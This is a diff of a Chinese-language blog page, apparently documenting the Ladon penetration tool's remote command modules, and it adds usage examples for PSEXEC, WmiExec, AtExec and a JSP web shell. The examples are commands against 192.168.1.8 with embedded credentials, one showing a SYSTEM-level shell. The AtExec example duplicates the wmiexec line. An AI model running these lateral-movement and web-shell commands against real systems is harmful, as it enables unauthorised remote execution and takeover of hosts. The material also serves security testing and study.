@@ -27,8 +27,7 @@
 
 
 简介Ladon远程执行命令PSEXEC交互式回显需先连接IPC，然后再通过psexec执行命令，类似psexec
-WmiExec非交互回显无需连接IPC
-AtExec非交互回显无需连接...">
+1234net user \\192.168.1.8 k8gege52...">
 
 
 <meta name="robots" content="all">
@@ -165,10 +164,17 @@ Visit <span id="busuanzi_value_page_pv"></span>
 %>
 </%></p>
 
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><h3 id="Ladon远程执行命令"><a href="#Ladon远程执行命令" class="headerlink" title="Ladon远程执行命令"></a>Ladon远程执行命令</h3><h4 id="PSEXEC交互式回显"><a href="#PSEXEC交互式回显" class="headerlink" title="PSEXEC交互式回显"></a>PSEXEC交互式回显</h4><p>需先连接IPC，然后再通过psexec执行命令，类似psexec<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/psexec.PNG"></p>
-<h4 id="WmiExec非交互回显"><a href="#WmiExec非交互回显" class="headerlink" title="WmiExec非交互回显"></a>WmiExec非交互回显</h4><p>无需连接IPC<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/wmiexec.PNG"></p>
-<h4 id="AtExec非交互回显"><a href="#AtExec非交互回显" class="headerlink" title="AtExec非交互回显"></a>AtExec非交互回显</h4><p>无需连接IPC<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/atexec.PNG"></p>
-<h4 id="JspShell非交互回显"><a href="#JspShell非交互回显" class="headerlink" title="JspShell非交互回显"></a>JspShell非交互回显</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShellExec.PNG"></p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><h3 id="Ladon远程执行命令"><a href="#Ladon远程执行命令" class="headerlink" title="Ladon远程执行命令"></a>Ladon远程执行命令</h3><h4 id="PSEXEC交互式回显"><a href="#PSEXEC交互式回显" class="headerlink" title="PSEXEC交互式回显"></a>PSEXEC交互式回显</h4><p>需先连接IPC，然后再通过psexec执行命令，类似psexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user \\192.168.1.8 k8gege520 /user:k8gege</span><br><span class="line">Ladon psexec 192.168.1.8</span><br><span class="line">psexec&gt; whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/psexec.PNG"></p>
+<h4 id="WmiExec非交互回显"><a href="#WmiExec非交互回显" class="headerlink" title="WmiExec非交互回显"></a>WmiExec非交互回显</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami</span><br></pre></td></tr></table></figure>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/wmiexec.PNG"></p>
+<h4 id="AtExec非交互回显"><a href="#AtExec非交互回显" class="headerlink" title="AtExec非交互回显"></a>AtExec非交互回显</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami</span><br></pre></td></tr></table></figure>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/atexec.PNG"></p>
+<h4 id="JspShell非交互回显"><a href="#JspShell非交互回显" class="headerlink" title="JspShell非交互回显"></a>JspShell非交互回显</h4><p>支持菜刀以及Ladon自动GetShell时传的UAshell，详见：<a href="http://k8gege.org/p/ladon_cs_shell.html">http://k8gege.org/p/ladon_cs_shell.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon JspShell <span class="built_in">type</span> url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShellExec.PNG"></p>
 <p>PS: 添加以上功能，主要是为了方便，无需传一堆文件。其它功能待续…</p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download/Ladon.rar">https://k8gege.org/Download/Ladon.rar</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 
